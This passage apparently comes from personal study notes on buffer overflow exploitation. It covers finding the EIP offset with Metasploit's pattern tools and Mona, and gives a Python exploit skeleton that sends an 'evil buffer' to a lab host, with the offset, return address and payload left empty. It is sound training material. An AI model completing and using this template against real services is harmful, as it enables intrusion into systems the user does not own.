# 2. Finding EIP position
## 2.1 Find where EIP is :
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <pattern_length>

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <pattern_length> -q <eip_value>
```

![[Finding offset.png]]

## 2.2 Other way to get the offset (Using Mona module)
```bash
!mona findmsp -distance 2000
```

![[Using mona to find EIP position.png]]

## 2.3 Example of python3 code
```python
#!/usr/bin/python3

import socket

ip = "10.10.2.75"
port = 1337
prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
# Insert what was generated by pattern_create here :
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```